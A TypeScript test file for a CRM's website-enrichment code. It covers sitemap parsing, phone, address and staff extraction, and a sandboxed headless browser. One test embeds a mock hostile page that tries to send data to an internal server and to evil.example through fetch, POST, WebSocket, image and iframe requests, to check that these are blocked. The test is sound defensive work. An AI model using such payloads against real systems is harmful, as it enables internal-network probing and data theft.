import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { readSitePages, type SiteIo } from '../src/crm/enrichment/site-reader';
import { looksEmpty, pagesFromList, pagesToRead, readWebsite, sitemapEntries, sitemapsInRobots, impliedCountry, unlabelledPhones } from '../src/crm/enrichment/website';
import { looksLikeName, looksLikeTitle, peopleOnPages } from '../src/crm/enrichment/people';
import { sameName, withoutLegalEnding } from '../src/crm/enrichment/wikidata';
import { findBrowser, PageRenderer } from '../src/crm/page-renderer';
import type { SiteFetcher } from '../src/crm/site-fetch';

/** Reading sites that hide their details (ADR 0079): page choice, looser reading, and the hidden browser's fences. */

describe('choosing the pages to read', () => {
  it('finds About, Contact and Offices pages in a sitemap, the shortest address first', () => {
    const { urls, index } = sitemapEntries(
      '<urlset><url><loc>https://acme.example/</loc></url><url><loc>https://acme.example/contact-us/thank-you</loc></url><url><loc> https://acme.example/contact-us </loc></url><url><loc><![CDATA[https://acme.example/about]]></loc></url><url><loc>https://other.example/offices</loc></url></urlset>',
    );
    expect(index).toBe(false);
    expect(pagesFromList(urls, 'acme.example', { about: null, contact: null, offices: null })).toEqual({ about: 'https://acme.example/about', contact: 'https://acme.example/contact-us', offices: null });
    // Pages already found from links are kept.
    expect(pagesFromList(urls, 'acme.example', { about: 'https://acme.example/who-we-are', contact: null, offices: null }).about).toBe('https://acme.example/who-we-are');
    expect(sitemapEntries('<sitemapindex><sitemap><loc>https://acme.example/page-sitemap.xml</loc></sitemap></sitemapindex>').index).toBe(true);
    expect(sitemapsInRobots('User-agent: *\nDisallow: /cart\nSitemap: https://acme.example/sitemap_index.xml\nsitemap: https://acme.example/news.xml')).toEqual(['https://acme.example/sitemap_index.xml', 'https://acme.example/news.xml']);
  });

  it('reads a linked business sub-site when the home page has no About page', () => {
    const home = { url: 'https://pollpocket.example/', html: '<a href="https://business.pollpocket.example/">Find out more</a><a href="https://shop.pollpocket.example/">Shop</a>' };
    expect(pagesToRead(home, 'pollpocket.example').about).toBe('https://business.pollpocket.example/');
    // A shop or blog sub-site is not the company's own page.
    expect(pagesToRead({ ...home, html: '<a href="https://shop.pollpocket.example/">Shop</a>' }, 'pollpocket.example').about).toBeNull();
  });

  it('tells a page built by JavaScript from a page with content', () => {
    expect(looksEmpty('<html><head><title>App</title></head><body><div id="root"></div><script src="/a.js"></script></body></html>')).toBe(true);
    expect(looksEmpty(`<html><body><nav>${'<a href="/x">Link</a>'.repeat(8)}</nav><p>${'Words about the company. '.repeat(30)}</p></body></html>`)).toBe(false);
  });

  it('does not take a single-page app’s home page for its About or Contact page', async () => {
    const shell = '<html><body><div id="root"></div></body></html>';
    const asked: string[] = [];
    const io: SiteIo = {
      page: async (u) => (asked.push(u), { url: u, html: shell }),
      file: async () => null,
      render: null,
    };
    const read = await readSitePages(io, 'shell.example');
    expect(read?.pages.map((p) => p.url)).toEqual(['https://shell.example/']);
    expect(asked).toEqual(expect.arrayContaining(['https://shell.example/contact-us', 'https://shell.example/about-us']));
  });
});

describe('matching names on Wikidata', () => {
  it('ignores capitals, punctuation and legal endings', () => {
    expect(withoutLegalEnding('Frequent Research Fieldwork Solutions Private Limited')).toBe('Frequent Research Fieldwork Solutions');
    expect(withoutLegalEnding('Acme Holdings Pty. Ltd.')).toBe('Acme Holdings');
    expect(sameName('Pureprofile', 'pureprofile Ltd')).toBe(true);
    expect(sameName('Globex Analytics plc', 'GLOBEX ANALYTICS')).toBe(true);
    expect(sameName('Globex Analytics', 'Globex')).toBe(false);
  });
});

describe('reading page text more loosely', () => {
  it('reads phone numbers shown without a label, but not figures in sentences', () => {
    expect(unlabelledPhones('+91 120 456 7890')).toEqual(['+91 120 456 7890']);
    expect(unlabelledPhones('Call us +1 (206) 555-0182 today')).toEqual(['+1 (206) 555-0182']);
    expect(unlabelledPhones('020 4000 1234')).toEqual(['020 4000 1234']);
    expect(unlabelledPhones('We ran 2009 2015 2026 surveys')).toEqual([]);
    expect(unlabelledPhones('Over 1,250,000 members')).toEqual([]);
  });

  it('knows the country of an address that leaves it out', () => {
    expect(impliedCountry('1200 Pine Street, Suite 40, Seattle, WA 98101')?.code).toBe('US');
    expect(impliedCountry('Tower B, Sector 62, Noida, Uttar Pradesh 201301')?.code).toBe('IN');
    expect(impliedCountry('18 Canal Street, Manchester M1 3HE')?.code).toBe('GB');
    expect(impliedCountry('Some Street 12, 1000 Somewhere')).toBeNull();
  });

  it('reads an address written over several lines or elements', () => {
    const html = '<footer><div><h4>Head Office</h4><p>Tower B, 9th Floor</p><p>Sector 62, Noida</p><p>Uttar Pradesh 201301</p></div><div><h4>New York Office</h4><span>11 Park Place, Floor 3</span><br><span>New York, NY 10007</span></div></footer>';
    const found = readWebsite([{ url: 'https://acme.example/', html }], 'acme.example', null);
    const hq = Object.fromEntries(found.filter((c) => ['city', 'postalCode', 'country'].includes(c.field)).map((c) => [c.field, c.value]));
    expect(hq).toMatchObject({ city: 'Noida', postalCode: '201301', country: 'IN' });
    const offices = found.find((c) => c.field === 'addresses')?.value as { country: string; postalCode: string }[];
    expect(offices).toEqual(expect.arrayContaining([expect.objectContaining({ label: 'New York Office', country: 'US', city: 'New York', postalCode: '10007' })]));
  });
});

const chromium = findBrowser(process.env.COMPANY_AUTOFILL_BROWSER_PATH);
if (!chromium && process.env.CI) throw new Error('CI needs a Chromium for the hidden-browser tests (google-chrome is on GitHub runners)');

describe('finding people on a page', () => {
  it('takes a person card and leaves service cards, headings and quotes alone', () => {
    const html = `<main>
      <div class="card"><h3>Online Surveys</h3><p>Fast fieldwork.</p></div>
      <div class="card"><h3>Data Processing</h3><p>Quality checked.</p></div>
      <div class="card"><h3>Meet The Team</h3><p>Research leads</p></div>
      <blockquote><p>Great partner.</p><cite>Tom Baker</cite></blockquote>
      <div class="person"><h4>Anika Rao</h4><p>Head of Fieldwork</p><a href="https://in.linkedin.com/in/anika-rao/?trk=x">LinkedIn</a></div>
    </main>`;
    const people = peopleOnPages([{ url: 'https://acme.example/team', html }], 'acme.example');
    expect(people).toEqual([{ name: 'Anika Rao', title: 'Head of Fieldwork', email: null, linkedinUrl: 'https://www.linkedin.com/in/anika-rao', source: 'WEBSITE', url: 'https://acme.example/team' }]);
    expect(looksLikeName('Online Surveys')).toBe(false);
    expect(looksLikeTitle('Fast fieldwork.')).toBe(false);
    expect(looksLikeTitle('Senior Research Consultant')).toBe(true);
  });
});

describe.skipIf(!chromium)('the hidden browser', () => {
  let outside: Server;
  let outsideUrl: string;
  const outsideHits: string[] = [];
  let renderer: PageRenderer;

  beforeAll(async () => {
    // Stands for the internal network: nothing a page does may reach it.
    outside = createServer((req, res) => {
      outsideHits.push(req.url ?? '');
      res.writeHead(200, { 'content-type': 'text/plain', 'access-control-allow-origin': '*' }).end('secret');
    });
    await new Promise<void>((r) => outside.listen(0, '127.0.0.1', r));
    outsideUrl = `http://127.0.0.1:${(outside.address() as AddressInfo).port}`;
    renderer = new PageRenderer(chromium!);
  });
  afterAll(async () => {
    await renderer.close();
    await new Promise((r) => outside.close(r));
  });

  /** A stand-in for the server's checked fetch: serves `pages`, refuses everything else, and records each request. */
  const fakeNet = (pages: Record<string, { type: string; body: string; status?: number; location?: string }>) => {
    const asked: string[] = [];
    const net = {
      raw: async (url: string) => {
        asked.push(url);
        const p = pages[url];
        if (!p) return null;
        const headers = new Headers({ 'content-type': p.type, ...(p.location ? { location: p.location } : {}) });
        return { status: p.status ?? 200, headers, body: Buffer.from(p.body) };
      },
    } as unknown as SiteFetcher;
    return { net, asked };
  };

  it('draws the page from requests the server makes, following redirects itself', async () => {
    const { net, asked } = fakeNet({
      'https://acme.example/': { type: 'text/html', body: '', status: 301, location: 'https://www.acme.example/' },
      'https://www.acme.example/': { type: 'text/html', body: '<html><body><div id="r"></div><script src="/a.js"></script></body></html>' },
      'https://www.acme.example/a.js': { type: 'text/javascript', body: "document.getElementById('r').innerHTML = '<a href=\"mailto:info@acme.example\">Mail</a>'" },
    });
    const page = await renderer.render('https://acme.example/', net, 10_000);
    expect(page).toMatchObject({ url: 'https://www.acme.example/', status: 200 });
    expect(page!.html).toContain('mailto:info@acme.example');
    expect(asked).toEqual(['https://acme.example/', 'https://www.acme.example/', 'https://www.acme.example/a.js']);
  });

  it('never lets a page reach anything the server did not fetch for it', async () => {
    const leak = `${outsideUrl}/leak`;
    const { net, asked } = fakeNet({
      'https://evil.example/': {
        type: 'text/html',
        body: `<html><body><img src="${leak}-img"><iframe src="${leak}-frame"></iframe><link rel="stylesheet" href="https://evil.example/s.css"><script>
          fetch('${leak}-fetch').catch(() => {});
          fetch('https://evil.example/data', { method: 'POST', body: 'x' }).catch(() => {});
          try { new WebSocket('${outsideUrl.replace('http', 'ws')}/ws'); } catch (e) {}
          document.body.insertAdjacentHTML('beforeend', '<p id="done">done</p>');
        </script></body></html>`,
      },
    });
    const page = await renderer.render('https://evil.example/', net, 10_000);
    expect(page?.html).toContain('id="done"');
    // Plain http, POST, style sheets and images are refused before any request; nothing reached the outside server.
    expect(asked).toEqual(['https://evil.example/']);
    expect(outsideHits).toEqual([]);
  });

  it('gives up on a page it cannot open', async () => {
    const { net } = fakeNet({});
    expect(await renderer.render('https://nowhere.example/', net, 5_000)).toBeNull();
  });
});
